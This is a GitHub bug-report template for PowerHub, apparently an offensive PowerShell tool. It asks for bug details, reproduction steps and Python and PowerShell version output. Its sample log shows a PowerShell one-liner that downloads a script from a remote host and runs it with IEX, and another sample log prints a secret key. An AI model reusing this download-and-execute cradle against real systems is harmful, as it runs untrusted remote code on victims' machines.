---
name: Bug report
about: Create a report to help us improve
title: ''
labels: bug
assignees: ''

---

Thanks for reporting a bug! To make the report more useful, please fill out the following fields and delete this line. Also, [read this](https://adrianvollmer.github.io/PowerHub/latest/contrib.html).

**Describe the bug**
A clear and concise description of what the bug is.

**To Reproduce**
Steps to reproduce the behavior:
1. Go to '...'
2. Click on '....'
3. Scroll down to '....'
4. See error

**Expected behavior**
A clear and concise description of what you expected to happen.

**Logs (please complete the following information):**
Python log:
```
$ powerhub -d 192.168.1.1
I 2023-02-27 21:54:20 dhkex.py:19 Generating new Diffie-Hellman parameters
D 2023-02-27 21:54:20 tools.py:106 Loaded secret key: S0H5CrNL1aWshJnCMwnCZ6Cg9HlTztuO
I 2023-02-27 21:54:20 modules.py:52 Importing modules...
[...]
```

PowerShell log:
```
PS C:\Users\avollmer> Pl=New-Object Net.WebClient;IEX $Pl.DownloadString('http://192.168.11.2:8443/')
  _____   _____  _  _  _ _______  ______ _     _ _     _ ______
 |_____] |     | |  |  | |______ |_____/ |_____| |     | |_____]
 |       |_____| |__|__| |______ |    \_ |     | |_____| |_____]
2.0.0                       written by Adrian Vollmer, 2018-202
Run 'Help-PowerHub' for help
[...]
```

**Python versions (please complete the following information):**
 - Output of `python --version`:
 - Output of `pip freeze`:
   ```
   $pip freeze
   [...]
   ```

**PowerShell versions (please complete the following information):**
 - Output of `$PSVersionTable`

**Additional context**
Add any other context about the problem here.
